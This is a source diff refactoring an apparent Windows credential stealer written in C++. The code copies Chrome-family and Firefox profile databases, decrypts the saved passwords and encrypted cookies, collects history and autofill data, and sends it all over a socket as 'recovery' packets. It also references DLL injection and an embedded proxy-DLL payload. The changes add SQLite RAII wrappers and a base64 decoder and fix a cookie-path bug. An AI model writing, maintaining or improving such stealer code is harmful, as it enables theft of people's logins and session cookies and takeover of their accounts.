@@ -46,15 +46,55 @@ struct PacketHeader {
 
 #include "proxydll_payload.h"
 
-static std::vector<unsigned char> read_file_binary(const fs::path& p) {
-    std::ifstream f(p, std::ios::binary | std::ios::ate);
-    if (!f) return {};
-    auto size = f.tellg();
-    if (size <= 0) return {};
-    std::vector<unsigned char> buffer((size_t)size);
-    f.seekg(0, std::ios::beg);
-    f.read((char*)buffer.data(), size);
-    return buffer;
+// --- RAII for SQLite ---
+class SqliteDb {
+    sqlite3* db = nullptr;
+public:
+    SqliteDb() = default;
+    ~SqliteDb() { if (db) sqlite3_close(db); }
+    int open(const std::string& path, int flags) { return sqlite3_open_v2(path.c_str(), &db, flags, nullptr); }
+    sqlite3* get() { return db; }
+    operator sqlite3*() { return db; }
+};
+
+class SqliteStmt {
+    sqlite3_stmt* stmt = nullptr;
+public:
+    SqliteStmt() = default;
+    ~SqliteStmt() { if (stmt) sqlite3_finalize(stmt); }
+    int prepare(sqlite3* db, const char* sql) { return sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr); }
+    sqlite3_stmt* get() { return stmt; }
+    operator sqlite3_stmt*() { return stmt; }
+};
+
+// --- Utilities ---
+static std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
+    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int in_len = (int)encoded_string.size();
+    int i = 0, j = 0, in_ = 0;
+    unsigned char char_array_4[4], char_array_3[3];
+    std::vector<unsigned char> ret;
+    ret.reserve(in_len * 3 / 4);
+    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
+        char_array_4[i++] = encoded_string[in_]; in_++;
+        if (i == 4) {
+            for (i = 0; i < 4; i++) char_array_4[i] = (unsigned char)base64_chars.find(char_array_4[i]);
+            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
+            i = 0;
+        }
+    }
+    if (i) {
+        for (j = i; j < 4; j++) char_array_4[j] = 0;
+        for (j = 0; j < 4; j++) char_array_4[j] = (unsigned char)base64_chars.find(char_array_4[j]);
+        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
+    }
+    return ret;
 }
 
 static bool send_all(SOCKET sock, const char* buf, int len) {
@@ -71,17 +111,15 @@ static bool send_recovery_file(SOCKET sock, const std::string& relPath, const st
     uint32_t pathLen = (uint32_t)relPath.size();
     uint32_t offset = 0;
     uint32_t payloadSize = 4 + pathLen + 4 + (uint32_t)data.size();
-
     PacketHeader header;
     header.signature = PACKET_SIGNATURE;
     header.type = PACKET_TYPE_RECOVERY_FILE;
     header.size = payloadSize;
-
     if (!send_all(sock, (const char*)&header, sizeof(header))) return false;
     if (!send_all(sock, (const char*)&pathLen, 4)) return false;
     if (!send_all(sock, relPath.c_str(), (int)pathLen)) return false;
     if (!send_all(sock, (const char*)&offset, 4)) return false;
-    if (!data.empty() && !send_all(sock, (const char*)data.data(), (int)data.size())) return false;
+    if (!data.empty()) return send_all(sock, (const char*)data.data(), (int)data.size());
     return true;
 }
 
@@ -94,6 +132,17 @@ static bool send_recovery_json(SOCKET sock, const std::string& relPath, const js
 static bool send_recovery_text(SOCKET sock, const std::string& relPath, const std::string& text) {
     std::vector<unsigned char> data(text.begin(), text.end());
     return send_recovery_file(sock, relPath, data);
+}
+
+static std::vector<unsigned char> read_file_binary(const fs::path& p) {
+    std::ifstream f(p, std::ios::binary | std::ios::ate);
+    if (!f) return {};
+    auto size = f.tellg();
+    if (size <= 0) return {};
+    std::vector<unsigned char> buffer((size_t)size);
+    f.seekg(0, std::ios::beg);
+    f.read((char*)buffer.data(), size);
+    return buffer;
 }
 
 struct PasswordData { std::string url, username, password; };
@@ -211,12 +260,6 @@ static bool copy_db_with_sidecars(const fs::path& source_db, const fs::path& des
     if (fs::exists(src + L"-shm")) copy_file_locked(src + L"-shm", dst + L"-shm");
     if (fs::exists(src + L"-journal")) copy_file_locked(src + L"-journal", dst + L"-journal");
     return true;
-}
-
-static int open_db_for_extraction(const std::string& path, sqlite3** db) {
-    int rc = sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, nullptr);
-    if (rc == SQLITE_OK) sqlite3_exec(*db, "PRAGMA wal_checkpoint(TRUNCATE);", nullptr, nullptr, nullptr);
-    return rc;
 }
 
 static void cleanup_db_temp(const fs::path& db_path) {
@@ -419,11 +462,11 @@ static void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
             SetCurrentDirectoryW(saved_cwd);
         }
         fs::path c_db = p_path / "cookies.sqlite"; fs::path tc_db = temp_dir / (p_name_sanit + "_cook.tmp");
-        if (copy_db_with_sidecars(c_db, tc_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(tc_db.wstring()), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) p_data.cookies.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), get_sqlite_text(stmt, 2), get_sqlite_text(stmt, 3), (sqlite3_column_int64(stmt, 4) + 11644473600LL) * 1000000, sqlite3_column_int(stmt, 5), sqlite3_column_int(stmt, 6), 0 }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(tc_db); }
+        if (copy_db_with_sidecars(c_db, tc_db)) { SqliteDb sdb; if (sdb.open(wstring_to_utf8(tc_db.wstring()), SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX) == SQLITE_OK) { SqliteStmt st; if (st.prepare(sdb, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies") == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.cookies.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), get_sqlite_text(st, 2), get_sqlite_text(st, 3), (sqlite3_column_int64(st, 4) + 11644473600LL) * 1000000, (int)sqlite3_column_int(st, 5), (int)sqlite3_column_int(st, 6), 0 }); } } cleanup_db_temp(tc_db); }
         fs::path h_db = p_path / "places.sqlite"; fs::path th_db = temp_dir / (p_name_sanit + "_hist.tmp");
-        if (copy_db_with_sidecars(h_db, th_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(th_db.wstring()), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM moz_places LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), (int)sqlite3_column_int(stmt, 2) }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(th_db); }
+        if (copy_db_with_sidecars(h_db, th_db)) { SqliteDb sdb; if (sdb.open(wstring_to_utf8(th_db.wstring()), SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX) == SQLITE_OK) { SqliteStmt st; if (st.prepare(sdb, "SELECT url, title, visit_count FROM moz_places LIMIT 500") == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), (int)sqlite3_column_int(st, 2) }); } } cleanup_db_temp(th_db); }
         fs::path a_db = p_path / "formhistory.sqlite"; fs::path ta_db = temp_dir / (p_name_sanit + "_auto.tmp");
-        if (copy_db_with_sidecars(a_db, ta_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(ta_db.wstring()), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT fieldname, value FROM moz_formhistory", -1, &stmt, nullptr) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1) }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(ta_db); }
+        if (copy_db_with_sidecars(a_db, ta_db)) { SqliteDb sdb; if (sdb.open(wstring_to_utf8(ta_db.wstring()), SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX) == SQLITE_OK) { SqliteStmt st; if (st.prepare(sdb, "SELECT fieldname, value FROM moz_formhistory") == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1) }); } } cleanup_db_temp(ta_db); }
         fs::path aj_path = p_path / "autofill-profiles.json";
         if (fs::exists(aj_path)) {
             try {
@@ -545,12 +588,12 @@ static void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dl
         fs::path p_path = data / p; ProfileData p_data; p_data.name = p; std::string p_san = p; std::replace(p_san.begin(), p_san.end(), '/', '_'); std::replace(p_san.begin(), p_san.end(), '\\', '_'); std::replace(p_san.begin(), p_san.end(), ':', '_');
         std::string b_name_utf8 = wstring_to_utf8(browser.name);
 
-        fs::path db = p_path / pass_db_name, t_db = temp / (p_san + "_pass.tmp");
-        if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT origin_url, username_value, password_value FROM logins", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 2); int len = sqlite3_column_bytes(st, 2); if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) p_data.passwords.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), to_utf8_lossy(d) }); } } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
-        db = p_path / "Network/Cookies"; if (!fs::exists(db)) db = p_path / "Cookies"; t_db = temp / (p_san + "_cook.tmp");
-        if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 7); int len = sqlite3_column_bytes(st, 7); std::string val; if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) val = to_utf8_lossy(d); } if (val.empty()) val = get_sqlite_text(st, 8); if (!val.empty()) p_data.cookies.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), val, get_sqlite_text(st, 2), sqlite3_column_int64(st, 3), (int)sqlite3_column_int(st, 4), (int)sqlite3_column_int(st, 5), (int)sqlite3_column_int(st, 6) }); } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
-        db = p_path / "History"; t_db = temp / (p_san + "_hist.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), (int)sqlite3_column_int(st, 2) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
-        db = p_path / "Web Data"; t_db = temp / (p_san + "_web.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT name, value FROM autofill", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
+        fs::path dbp = p_path / pass_db_name, t_db = temp / (p_san + "_pass.tmp");
+        if (copy_db_with_sidecars(dbp, t_db)) { SqliteDb sdb; if (sdb.open(wstring_to_utf8(t_db.wstring()), SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX) == SQLITE_OK) { SqliteStmt st; if (st.prepare(sdb, "SELECT origin_url, username_value, password_value FROM logins") == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 2); int len = sqlite3_column_bytes(st, 2); if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) p_data.passwords.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), to_utf8_lossy(d) }); } } } } cleanup_db_temp(t_db); }
+        dbp = p_path / "Network/Cookies"; if (!fs::exists(dbp)) dbp = p_path / "Cookies"; t_db = temp / (p_san + "_cook.tmp");
+        if (copy_db_with_sidecars(dbp, t_db)) { SqliteDb sdb; if (sdb.open(wstring_to_utf8(t_db.wstring()), SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX) == SQLITE_OK) { SqliteStmt st; if (st.prepare(sdb, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies") == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 7); int len = sqlite3_column_bytes(st, 7); std::string val; if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) val = to_utf8_lossy(d); } if (val.empty()) val = get_sqlite_text(st, 8); if (!val.empty()) p_data.cookies.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), val, get_sqlite_text(st, 2), sqlite3_column_int64(st, 3), (int)sqlite3_column_int(st, 4), (int)sqlite3_column_int(st, 5), (int)sqlite3_column_int(st, 6) }); } } } cleanup_db_temp(t_db); }
+        dbp = p_path / "History"; t_db = temp / (p_san + "_hist.tmp"); if (copy_db_with_sidecars(dbp, t_db)) { SqliteDb sdb; if (sdb.open(wstring_to_utf8(t_db.wstring()), SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX) == SQLITE_OK) { SqliteStmt st; if (st.prepare(sdb, "SELECT url, title, visit_count FROM urls LIMIT 500") == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), (int)sqlite3_column_int(st, 2) }); } } cleanup_db_temp(t_db); }
+        dbp = p_path / "Web Data"; t_db = temp / (p_san + "_web.tmp"); if (copy_db_with_sidecars(dbp, t_db)) { SqliteDb sdb; if (sdb.open(wstring_to_utf8(t_db.wstring()), SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX) == SQLITE_OK) { SqliteStmt st; if (st.prepare(sdb, "SELECT name, value FROM autofill") == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1) }); } } cleanup_db_temp(t_db); }
         if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
             try {
                 std::stringstream ss_p; json j_p = json::array(); for (auto& i : p_data.passwords) { ss_p << "URL: " << i.url << "\nUser: " << i.username << "\nPass: " << i.password << "\n\n"; j_p.push_back({{"url", ensure_utf8(i.url)}, {"username", ensure_utf8(i.username)}, {"password", ensure_utf8(i.password)}}); }
@@ -560,7 +603,7 @@ static void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dl
                 std::stringstream ss_c; json j_c = json::array(); for (auto& i : p_data.cookies) {
                     ss_c << "Host: " << i.host << " | Name: " << i.name << " | Value: " << i.value << "\n";
                     json cj; std::string hr = i.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
-                    cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(i.name); cj["Path raw"] = ensure_utf8(c.path); cj["Content raw"] = ensure_utf8(i.value);
+                    cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(i.name); cj["Path raw"] = ensure_utf8(i.path); cj["Content raw"] = ensure_utf8(i.value);
                     long long ut = (i.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                     cj["Expires raw"] = std::to_string(ut); cj["Send for"] = i.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = i.is_secure ? "true" : "false"; cj["HTTP only raw"] = i.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (i.host[0] == '.') ? "false" : "true"; j_c.push_back(cj);
                 }
